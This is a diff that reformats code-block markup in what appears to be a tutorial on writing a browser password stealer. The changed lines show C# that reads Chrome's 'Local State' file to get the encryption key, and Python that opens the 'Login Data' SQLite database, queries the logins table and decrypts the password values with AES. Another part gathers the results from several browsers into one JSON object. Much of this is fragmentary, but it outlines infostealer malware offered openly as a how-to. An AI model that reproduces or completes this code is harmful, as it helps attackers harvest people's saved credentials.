@@ -707,13 +707,14 @@ Obtaining and decrypting the key:
 
 [CODE]
 
-    string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");[/CODE] Specifies the path to the file with the key
+    string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");
+[/CODE] Specifies the path to the file with the key
 [CODE]
 
     string localStateData = File.ReadAllText(localStatePath); 
 [/CODE] Reads data from a file
 [CODE]
-
+    
     dynamic json = JObject.Parse(localStateData); 
 [/CODE] Converts file contents to json
 [CODE]
@@ -827,7 +828,8 @@ Now let's look at the code for decrypting the password using the key obtained ea
 [/CODE] Skips the first 3 characters and defines characters 4 to 15 as IV. Then from the 15th character to the end it defines it as a password. Decrypts the password via AES using the key specified below.
 [CODE=python]
 
-    login_data_path [/CODE] Path to the database file with passwords
+    login_data_path 
+[/CODE] Path to the database file with passwords
 [CODE=python]
 
     connection = sqlite3.connect(login_data_path)
@@ -835,7 +837,8 @@ Now let's look at the code for decrypting the password using the key obtained ea
  [/CODE] Connect to the database
 [CODE=python]
 
-    cursor.execute("SELECT password_value FROM logins") [/CODE] Execute a query against the logins table and within it against the password_value column
+    cursor.execute("SELECT password_value FROM logins") 
+[/CODE] Execute a query against the logins table and within it against the password_value column
 [CODE=python]
 
     master_key_base64 [/CODE] Key in base 64 format
@@ -861,7 +864,8 @@ Inside the method we will specify the dictionary to the main browser folders whe
 We create the main JSON object in which all information will be stored. 
 [CODE]
 
-    JObject mainJson = new JObject();[/CODE]
+    JObject mainJson = new JObject();
+[/CODE]
 Also in the foreach loop we read the contents from the file with the key 
 [CODE]
 
